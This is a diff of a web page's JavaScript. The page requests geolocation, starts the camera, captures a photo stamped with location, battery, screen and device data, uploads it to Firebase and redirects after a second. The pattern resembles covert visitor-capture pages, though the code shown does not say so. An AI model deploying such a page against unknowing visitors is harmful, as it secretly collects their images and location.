@@ -32,10 +32,6 @@ function getLocation() {
             console.error('Error accessing location:', error);
             document.getElementById('message').textContent = 'Location access denied or an error occurred.';
             startVideo(); // Start video even if location access is denied
-        }, {
-            enableHighAccuracy: true, // Enable high accuracy for better GPS data
-            timeout: 10000,           // Timeout after 10 seconds
-            maximumAge: 0             // Do not use a cached location
         });
     } else {
         console.error('Geolocation is not supported by this browser.');
@@ -52,8 +48,25 @@ function formatDateTime() {
     return `${day}, ${date}, ${time}`;
 }
 
+// Function to capture phone stats
+async function getPhoneStats() {
+    const battery = await navigator.getBattery();
+    const batteryLevel = (battery.level * 100).toFixed(0); // Battery percentage
+    const screenWidth = window.screen.width;
+    const screenHeight = window.screen.height;
+    const userAgent = navigator.userAgent;
+    const deviceType = /Mobile|Android|iPhone|iPad|iPod/.test(userAgent) ? 'Mobile' : 'Desktop/Laptop';
+
+    return {
+        batteryLevel,
+        screenWidth,
+        screenHeight,
+        deviceType
+    };
+}
+
 // Function to capture photo and upload to Firebase Storage with watermark
-function capturePhoto(video) {
+async function capturePhoto(video) {
     const canvas = document.createElement('canvas');
     const context = canvas.getContext('2d');
 
@@ -66,19 +79,29 @@ function capturePhoto(video) {
 
     // Check if location is available for watermark
     if (userLocation.latitude && userLocation.longitude) {
-        // Set watermark text with date, time, and location
-        const watermarkText = `Date: ${formatDateTime()} \nL: ${userLocation.latitude}, L: ${userLocation.longitude}`;
+        // Set watermark text with date, time, location, and device info
+        const phoneStats = await getPhoneStats();
+        const watermarkText = `
+            Date: ${formatDateTime()} 
+            Lat: ${userLocation.latitude}, Lon: ${userLocation.longitude}
+            Battery: ${phoneStats.batteryLevel}%
+            Screen: ${phoneStats.screenWidth}x${phoneStats.screenHeight}
+            Device: ${phoneStats.deviceType}
+        `;
 
         // Set watermark background
         context.fillStyle = 'black';
         context.globalAlpha = 0.5;
-        context.fillRect(0, canvas.height - 80, canvas.width, 80);  // Background rectangle
+        context.fillRect(0, canvas.height - 120, canvas.width, 120);  // Background rectangle
 
         // Set text properties for watermark
-        context.font = '20px Arial'; // Font size and type
+        context.font = '18px Arial'; // Font size and type
         context.fillStyle = 'white'; // Text color
         context.globalAlpha = 1.0; // Full opacity for the text
-        context.fillText(watermarkText, 10, canvas.height - 50); // Positioning the text
+        const lines = watermarkText.split('\n');
+        lines.forEach((line, index) => {
+            context.fillText(line, 10, canvas.height - 90 + (index * 20)); // Positioning the text
+        });
     }
 
     // Convert the canvas image to a Blob
@@ -96,16 +119,6 @@ function capturePhoto(video) {
             });
 
             console.log('Photo uploaded with filename:', fileName);
-
-            // Save metadata to the Realtime Database
-            const photoMetadata = {
-                fileName: fileName,
-                uploadTime: new Date().toISOString(),
-                location: userLocation
-            };
-            const metadataRef = database.ref('photos/' + fileName);
-            await metadataRef.set(photoMetadata);
-            console.log('Metadata saved to Firebase Database');
 
             // Redirect after 1 second
             setTimeout(() => {
